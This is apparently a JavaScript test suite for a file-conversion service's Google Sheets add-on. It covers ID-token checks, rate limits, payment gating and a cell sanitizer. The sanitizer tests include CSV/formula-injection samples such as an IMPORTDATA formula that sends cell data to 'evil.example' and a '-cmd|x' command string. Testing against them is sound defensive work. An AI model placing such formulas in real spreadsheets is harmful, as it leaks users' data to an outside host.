import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import vm from "node:vm";
import { onRequestPost as convert } from "../functions/api/convert.js";
import { onRequestPost as checkout } from "../functions/api/checkout.js";
import { onRequestPost as loadRows } from "../functions/api/result-rows.js";
import { resetGoogleKeyCacheForTests, verifySheetsAddonIdentity } from "../functions/lib/google-identity.js";
import { sha256 } from "../functions/lib/jobs.js";

const CLIENT_ID = "1234-addon.apps.googleusercontent.com";
const futureExpiry = () => new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();

const keyPair = await crypto.subtle.generateKey(
  { name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
  true,
  ["sign", "verify"]
);
const publicJwk = { ...(await crypto.subtle.exportKey("jwk", keyPair.publicKey)), kid: "test-kid", alg: "RS256", use: "sig" };

function base64Url(bytes) {
  return Buffer.from(bytes).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

async function signIdToken(claims, { kid = "test-kid", privateKey = keyPair.privateKey } = {}) {
  const now = Math.floor(Date.now() / 1000);
  const header = base64Url(new TextEncoder().encode(JSON.stringify({ alg: "RS256", kid, typ: "JWT" })));
  const payload = base64Url(
    new TextEncoder().encode(
      JSON.stringify({
        iss: "https://accounts.google.com",
        aud: CLIENT_ID,
        sub: "google-user-1",
        email: "person@example.com",
        email_verified: true,
        iat: now,
        exp: now + 3600,
        ...claims
      })
    )
  );
  const signature = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", privateKey, new TextEncoder().encode(`${header}.${payload}`));
  return `${header}.${payload}.${base64Url(new Uint8Array(signature))}`;
}

const certsFetch = async () =>
  new Response(JSON.stringify({ keys: [publicJwk] }), { headers: { "Cache-Control": "public, max-age=600" } });

function addonRequest(url, token, init = {}) {
  return new Request(url, {
    method: "POST",
    ...init,
    headers: {
      "X-AIConverter-Client": "sheets-addon",
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(init.headers || {})
    }
  });
}

test("Sheets add-on identity accepts a valid Google ID token for a configured client", async () => {
  resetGoogleKeyCacheForTests();
  const token = await signIdToken({});
  const result = await verifySheetsAddonIdentity(
    { GOOGLE_SHEETS_ADDON_CLIENT_IDS: `other-client, ${CLIENT_ID}` },
    addonRequest("https://aiconverter.app/api/convert", token),
    { fetchImpl: certsFetch }
  );
  assert.deepEqual(result, { ok: true, sub: "google-user-1", email: "person@example.com" });
});

test("Sheets add-on identity rejects wrong audience, expired, unverified and tampered tokens", async () => {
  resetGoogleKeyCacheForTests();
  const env = { GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID };
  const now = Math.floor(Date.now() / 1000);
  const otherKeys = await crypto.subtle.generateKey(
    { name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
    true,
    ["sign", "verify"]
  );
  const cases = [
    await signIdToken({ aud: "someone-else" }),
    await signIdToken({ exp: now - 600, iat: now - 4000 }),
    await signIdToken({ iss: "https://evil.example" }),
    await signIdToken({ email_verified: false }),
    await signIdToken({}, { privateKey: otherKeys.privateKey }),
    await signIdToken({}, { kid: "unknown-kid" }),
    "not-a-jwt"
  ];
  for (const token of cases) {
    const result = await verifySheetsAddonIdentity(env, addonRequest("https://aiconverter.app/api/convert", token), {
      fetchImpl: certsFetch
    });
    assert.equal(result.ok, false, `token should be rejected: ${token.slice(0, 40)}`);
    assert.equal(result.status, 401);
  }
});

test("Sheets add-on is disabled until a Google client ID is configured", async () => {
  const response = await convert({
    env: { AICONVERTER_BUCKET: {}, AICONVERTER_DB: {} },
    request: addonRequest("https://aiconverter.app/api/convert", "anything", { body: new FormData() })
  });
  assert.equal(response.status, 503);
  assert.match((await response.json()).error, /not enabled/);
});

test("Sheets add-on uploads skip Turnstile and rate-limit by Google account, not IP", async () => {
  resetGoogleKeyCacheForTests();
  const originalFetch = globalThis.fetch;
  globalThis.fetch = certsFetch;
  const rateLimitIds = [];
  try {
    const token = await signIdToken({});
    const form = new FormData();
    form.set("file", new File(["hello"], "notes.txt", { type: "text/plain" }));
    form.set("converterId", "bank");
    const response = await convert({
      env: {
        GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID,
        TURNSTILE_SITE_KEY: "site",
        TURNSTILE_SECRET_KEY: "secret",
        RATE_LIMIT_SALT: "a-long-enough-test-salt-for-rate-limits",
        AICONVERTER_BUCKET: {},
        AICONVERTER_DB: rateLimitDb(rateLimitIds)
      },
      request: addonRequest("https://aiconverter.app/api/convert", token, {
        headers: { "CF-Connecting-IP": "203.0.113.9" },
        body: form
      })
    });
    assert.equal(response.status, 400);
    assert.match((await response.json()).error, /accepts/);
    const ipKeyed = await sha256(`a-long-enough-test-salt-for-rate-limits:203.0.113.9:${hourWindow()}`);
    const accountKeyed = await sha256(`a-long-enough-test-salt-for-rate-limits:google:google-user-1:${hourWindow()}`);
    assert.ok(rateLimitIds.includes(accountKeyed), "rate limit should be keyed to the Google account");
    assert.ok(!rateLimitIds.includes(ipKeyed), "rate limit should not use Google's shared egress IP");
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("web uploads still require the Turnstile check", async () => {
  const form = new FormData();
  form.set("file", new File(["hello"], "notes.txt", { type: "text/plain" }));
  const response = await convert({
    env: {
      TURNSTILE_SITE_KEY: "site",
      TURNSTILE_SECRET_KEY: "secret",
      RATE_LIMIT_SALT: "a-long-enough-test-salt-for-rate-limits",
      AICONVERTER_BUCKET: {},
      AICONVERTER_DB: rateLimitDb([])
    },
    request: new Request("https://aiconverter.app/api/convert", { method: "POST", body: form })
  });
  assert.equal(response.status, 403);
});

test("Sheets add-on checkout returns buyers to the add-on page", async () => {
  const token = "tok_sheets_checkout";
  const job = {
    id: "job_sheets_checkout",
    token_hash: await sha256(token),
    status: "preview_ready",
    plan_id: "starter",
    expires_at: futureExpiry()
  };
  const response = await checkout({
    env: { ...jobEnv(job), CHECKOUT_URL: "https://checkout.dodopayments.com/buy/pdt_test" },
    request: new Request("https://aiconverter.app/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jobId: job.id, token, client: "sheets-addon" })
    })
  });
  const payload = await response.json();
  assert.equal(payload.mode, "checkout");
  const redirect = new URL(new URL(payload.checkoutUrl).searchParams.get("redirect_url"));
  assert.equal(redirect.pathname, "/google-sheets-pdf-import/");
  assert.equal(redirect.searchParams.get("jobId"), job.id);
});

test("paid table CSV rows can be read back for the Sheets import", async () => {
  const token = "tok_table_rows";
  const job = {
    id: "job_table_rows",
    token_hash: await sha256(token),
    status: "complete",
    paid_at: "2026-10-12T00:00:00.000Z",
    converter_id: "screenshot",
    output_format: "csv",
    result_key: "jobs/job_table_rows/result.csv",
    expires_at: futureExpiry()
  };
  const env = jobEnv(job, new Map([[job.result_key, "Item,Qty\nApples,3\nPears,5\n"]]));
  const response = await loadRows({
    env,
    request: new Request("https://aiconverter.app/api/result-rows", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jobId: job.id, token })
    })
  });
  assert.equal(response.status, 200);
  const payload = await response.json();
  assert.equal(payload.totalRows, 2);
  assert.equal(payload.outputLabel, "CSV");
  assert.deepEqual(payload.rows[1], { Item: "Pears", Qty: "5" });
});

test("unpaid table rows stay behind the payment gate", async () => {
  const token = "tok_table_unpaid";
  const job = {
    id: "job_table_unpaid",
    token_hash: await sha256(token),
    status: "complete",
    converter_id: "screenshot",
    output_format: "csv",
    result_key: "jobs/job_table_unpaid/result.csv",
    expires_at: futureExpiry()
  };
  const response = await loadRows({
    env: jobEnv(job, new Map([[job.result_key, "Item,Qty\nApples,3\n"]])),
    request: new Request("https://aiconverter.app/api/result-rows", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jobId: job.id, token })
    })
  });
  assert.equal(response.status, 402);
});

test("Apps Script add-on only calls aiconverter.app and identifies itself", () => {
  const manifest = JSON.parse(readFileSync("sheets-addon/appsscript.json", "utf8"));
  assert.deepEqual(manifest.urlFetchWhitelist, ["https://aiconverter.app/"]);
  assert.ok(manifest.oauthScopes.includes("openid"), "identity token needs the openid scope");
  assert.ok(
    manifest.oauthScopes.includes("https://www.googleapis.com/auth/spreadsheets.currentonly"),
    "add-on should only touch the open spreadsheet"
  );
  assert.ok(!manifest.oauthScopes.includes("https://www.googleapis.com/auth/spreadsheets"), "no broad Sheets scope");
  const code = readFileSync("sheets-addon/Code.gs", "utf8");
  assert.match(code, /ScriptApp\.getIdentityToken\(\)/);
  assert.match(code, /'X-AIConverter-Client': CLIENT_ID/);
  assert.match(code, /var CLIENT_ID = 'sheets-addon'/);
});

test("Sheets add-on identity drops an email Google has not marked verified", async () => {
  resetGoogleKeyCacheForTests();
  const token = await signIdToken({ email_verified: undefined });
  const result = await verifySheetsAddonIdentity(
    { GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID },
    addonRequest("https://aiconverter.app/api/convert", token),
    { fetchImpl: certsFetch }
  );
  assert.equal(result.ok, true);
  assert.equal(result.email, "");
});

test("Sheets add-on identity fails closed when Google certs cannot be fetched", async () => {
  resetGoogleKeyCacheForTests();
  const token = await signIdToken({});
  let calls = 0;
  const throwingFetch = async () => {
    calls += 1;
    throw new Error("network down");
  };
  const env = { GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID };
  const request = addonRequest("https://aiconverter.app/api/convert", token);
  const first = await verifySheetsAddonIdentity(env, request, { fetchImpl: throwingFetch });
  const second = await verifySheetsAddonIdentity(env, request, { fetchImpl: throwingFetch });
  assert.equal(first.ok, false);
  assert.equal(first.status, 401);
  assert.equal(second.ok, false);
  assert.equal(calls, 1, "a failed cert fetch should not be retried on every request");
  resetGoogleKeyCacheForTests();
});

test("Sheets add-on uploads stop at a shared hourly cap across all Google accounts", async () => {
  resetGoogleKeyCacheForTests();
  const originalFetch = globalThis.fetch;
  globalThis.fetch = certsFetch;
  try {
    const salt = "a-long-enough-test-salt-for-rate-limits";
    const sharedId = await sha256(`${salt}:sheets-addon:all-accounts:${hourWindow()}`);
    const counts = new Map([[sharedId, 3]]);
    const form = new FormData();
    form.set("file", new File(["hello"], "notes.txt", { type: "text/plain" }));
    const response = await convert({
      env: {
        GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID,
        SHEETS_ADDON_MAX_UPLOADS_PER_HOUR: "3",
        RATE_LIMIT_SALT: salt,
        AICONVERTER_BUCKET: {},
        AICONVERTER_DB: countingRateLimitDb(counts)
      },
      request: addonRequest("https://aiconverter.app/api/convert", await signIdToken({ sub: "fresh-account" }), { body: form })
    });
    assert.equal(response.status, 429);
    assert.match((await response.json()).error, /add-on is busy/);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("Sheets add-on per-account limit names the Google account, not the connection", async () => {
  resetGoogleKeyCacheForTests();
  const originalFetch = globalThis.fetch;
  globalThis.fetch = certsFetch;
  try {
    const salt = "a-long-enough-test-salt-for-rate-limits";
    const accountId = await sha256(`${salt}:google:google-user-1:${hourWindow()}`);
    const response = await convert({
      env: {
        GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID,
        RATE_LIMIT_SALT: salt,
        AICONVERTER_BUCKET: {},
        AICONVERTER_DB: countingRateLimitDb(new Map([[accountId, 8]]))
      },
      request: addonRequest("https://aiconverter.app/api/convert", await signIdToken({}), { body: new FormData() })
    });
    assert.equal(response.status, 429);
    assert.match((await response.json()).error, /this Google account/);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("rows from jobs with no converter id are not treated as bank exports", async () => {
  const token = "tok_null_converter";
  const job = {
    id: "job_null_converter",
    token_hash: await sha256(token),
    status: "complete",
    paid_at: "2026-10-12T00:00:00.000Z",
    converter_id: null,
    result_key: "jobs/job_null_converter/result.csv",
    expires_at: futureExpiry()
  };
  const response = await loadRows({
    env: jobEnv(job, new Map([[job.result_key, "A,B\n1,2\n"]])),
    request: new Request("https://aiconverter.app/api/result-rows", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jobId: job.id, token })
    })
  });
  assert.equal(response.status, 400);
});

test("Sheets add-on writes formula-like text as plain text but keeps numbers", () => {
  const sandbox = {};
  vm.createContext(sandbox);
  vm.runInContext(readFileSync("sheets-addon/Code.gs", "utf8"), sandbox);
  const safeCell = sandbox.safeCell_;
  assert.equal(safeCell('=IMPORTDATA("https://evil.example/?"&A1)'), `'=IMPORTDATA("https://evil.example/?"&A1)`);
  assert.equal(safeCell("+HYPERLINK(1)"), "'+HYPERLINK(1)");
  assert.equal(safeCell("-cmd|x"), "'-cmd|x");
  assert.equal(safeCell("@SUM(A1)"), "'@SUM(A1)");
  assert.equal(safeCell("-12.50"), "-12.50");
  assert.equal(safeCell("+1,250.00"), "+1,250.00");
  assert.equal(safeCell("Coffee shop"), "Coffee shop");
  assert.equal(safeCell("  =1+1"), "'  =1+1");
  assert.equal(safeCell("\t@SUM(A1)"), "'\t@SUM(A1)");
  assert.equal(safeCell(null), "");
  assert.equal(safeCell(42), 42);
});

function countingRateLimitDb(counts) {
  return {
    prepare(sql) {
      return {
        bind(...values) {
          return {
            run: async () => {
              if (sql.startsWith("INSERT INTO rate_limits")) counts.set(values[0], (counts.get(values[0]) || 0) + 1);
              return {};
            },
            first: async () => (sql.startsWith("SELECT count FROM rate_limits") ? { count: counts.get(values[0]) || 0 } : null),
            all: async () => ({ results: [] })
          };
        }
      };
    }
  };
}

function hourWindow() {
  const windowStart = new Date();
  windowStart.setMinutes(0, 0, 0);
  return windowStart.toISOString();
}

function rateLimitDb(ids) {
  return {
    prepare(sql) {
      return {
        bind(...values) {
          return {
            run: async () => {
              if (sql.startsWith("INSERT INTO rate_limits")) ids.push(values[0]);
              return {};
            },
            first: async () => (sql.startsWith("SELECT count FROM rate_limits") ? { count: 1 } : null),
            all: async () => ({ results: [] })
          };
        }
      };
    }
  };
}

function jobEnv(job, objects = new Map()) {
  return {
    AICONVERTER_BUCKET: {
      get: async (key) => (objects.has(key) ? { text: async () => objects.get(key) } : null)
    },
    AICONVERTER_DB: {
      prepare(sql) {
        if (sql.startsWith("SELECT * FROM jobs WHERE id = ? AND token_hash = ?")) {
          return {
            bind(id, tokenHash) {
              return { first: async () => (id === job.id && tokenHash === job.token_hash ? job : null) };
            }
          };
        }
        throw new Error(`Unexpected SQL: ${sql}`);
      }
    }
  };
}
